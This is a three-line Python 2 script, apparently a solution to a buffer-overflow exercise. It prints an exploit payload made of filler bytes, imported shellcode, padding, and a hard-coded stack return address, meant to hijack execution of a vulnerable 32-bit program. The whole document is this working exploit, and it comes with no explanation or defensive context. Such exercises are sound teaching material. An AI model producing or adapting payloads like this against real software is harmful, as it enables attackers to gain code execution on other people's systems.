from shellcode import shellcode
from struct import pack
print '\x10'*976+shellcode+'A'*37+pack("<I",0xbffea798-0x408)
